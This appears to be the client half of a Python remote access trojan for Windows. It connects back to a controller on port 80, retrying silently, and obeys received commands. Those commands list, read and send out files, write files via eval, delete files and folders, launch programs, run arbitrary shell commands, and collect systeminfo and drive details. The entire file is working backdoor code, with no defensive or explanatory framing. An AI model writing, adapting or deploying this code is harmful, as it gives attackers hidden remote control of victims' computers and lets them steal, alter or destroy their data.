import socket
import os
from uuid import uuid4
import subprocess
import platform

ADDR = socket.gethostbyname(socket.gethostname())
PORT = 80

os.chdir(os.getenv('USERPROFILE'))

def recvall(connection):

    data = ''
    
    data += connection.recv(4096).decode()

    dataSplit, data = data.split('|', 1)

    if dataSplit in data:
            data = data.replace('|' + dataSplit, '')
            return data

    while True:

        data += connection.recv(4096).decode()

        if dataSplit in data:
            data = data.replace('|' + dataSplit, '')
            return data

def getMsgWithDataSplit(msg):

    dataSplit = str(uuid4())

    return (dataSplit + '|' + str(msg) + '|' + dataSplit).encode()

while True:

    try:

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

            while True:

                try:
                    s.connect((ADDR, PORT))
                    break
                except:
                    pass

            while True:

                command = recvall(s)

                if command == 'Refresh':
                    s.sendall(getMsgWithDataSplit('online'))

                elif command == 'EstablishConnection':
                    s.sendall(getMsgWithDataSplit(os.getcwd()))
                
                elif command == 'ls':
                    try:
                        listedFiles = os.listdir()
                    except:
                        listedFiles = 'ERROR'
                    s.sendall(getMsgWithDataSplit(str(listedFiles)))
                
                elif command == 'cd':
                    changedDirectory = recvall(s)
                    if os.path.exists(changedDirectory) and os.path.isdir(changedDirectory):
                        os.chdir(changedDirectory)
                        s.sendall(getMsgWithDataSplit(os.getcwd()))
                    else:
                        s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'goto':
                    gotoDirectory = recvall(s)

                    if os.path.exists(gotoDirectory) and os.path.isdir(gotoDirectory):
                        os.chdir(gotoDirectory)
                        s.sendall(getMsgWithDataSplit(os.getcwd()))
                    else:
                        s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'size':
                    fileName = recvall(s)
                    try:
                        fileSize = os.stat(fileName).st_size
                    except:
                        fileSize = False
                    if fileSize:
                        s.sendall(getMsgWithDataSplit(f'{fileSize:,}'))
                    else:
                        s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'read':
                    fileName = recvall(s)
                    try:
                        with open(fileName, 'r') as f:
                            s.sendall(getMsgWithDataSplit(f.read()))
                    except:
                        try:
                            with open(fileName, 'rb') as f:
                                s.sendall(getMsgWithDataSplit(str(f.read())[2:-1]))
                        except:
                            s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'write':
                    fileName = recvall(s)
                    fileData = recvall(s)
                    if fileData == 'ERROR':
                        pass
                    else:
                        try:
                            if type(eval(fileData)) == bytes:
                                with open(fileName, 'wb') as f:
                                    f.write(eval(fileData))
                            else:
                                with open(fileName, 'w') as f:
                                    f.write(fileData)

                            s.sendall(getMsgWithDataSplit(os.path.join(os.getcwd(), fileName)))

                        except:
                            try:
                                with open(fileName, 'w') as f:
                                    f.write(fileData)
                                
                                s.sendall(getMsgWithDataSplit(os.path.join(os.getcwd(), fileName)))
                            except:
                            
                                s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'copy':
                    fileName = recvall(s)

                    if os.path.exists(fileName):
                        try:
                            with open(fileName, 'r') as f:
                                fileData = f.read()

                            s.sendall(getMsgWithDataSplit(fileData))
                        except:
                            try:
                                with open(fileName, 'rb') as f:
                                    fileData = f.read()
                                
                                s.sendall(getMsgWithDataSplit(str(fileData)))
                            except:
                                s.sendall(getMsgWithDataSplit('ERROR'))
                    else:
                        s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'run':
                    fileName = recvall(s)
                    try:
                        os.startfile(fileName)
                        s.sendall(getMsgWithDataSplit('Sucess'))
                    except:
                        s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'rm':
                    fileName = recvall(s)
                    try:
                        os.remove(fileName)
                        s.sendall(getMsgWithDataSplit('Success'))
                    except:
                        s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'mkdir':
                    folderName = recvall(s)
                    try:
                        os.mkdir(folderName)
                        s.sendall(getMsgWithDataSplit('Success'))
                    except:
                        s.sendall(getMsgWithDataSplit('ERROR'))

                
                elif command == 'rmdir':
                    folderName = recvall(s)
                    try:
                        os.rmdir(folderName)
                        s.sendall(getMsgWithDataSplit('Success'))
                    except:
                        s.sendall(getMsgWithDataSplit('ERROR'))

                elif command == 'exec':
                    executeCommand = recvall(s)
                    try:
                        commandResult = subprocess.check_output(executeCommand, shell = True)
                        s.sendall(getMsgWithDataSplit(commandResult.decode()))
                    except:
                        s.sendall(getMsgWithDataSplit('ERROR'))

                elif command == 'sysinfo':
                    try:
                        sysInfo = subprocess.check_output('systeminfo', shell = True)
                        s.sendall(getMsgWithDataSplit(sysInfo.decode()))
                    except:
                        s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'drives':
                    try:
                        sysInfo = subprocess.check_output('fsutil fsinfo drives', shell = True)
                        s.sendall(getMsgWithDataSplit(sysInfo.decode()))
                    except:
                        s.sendall(getMsgWithDataSplit('ERROR'))

                elif command == 'system':
                    try:
                        system = platform.system()
                        s.sendall(getMsgWithDataSplit(system))
                    except:
                        s.sendall(getMsgWithDataSplit('ERROR'))
                
                elif command == 'CloseConnection':
                    os.chdir(os.getenv('USERPROFILE'))

                else:
                    os.chdir(os.getenv('USERPROFILE'))
                    break

    except:
        os.chdir(os.getenv('USERPROFILE'))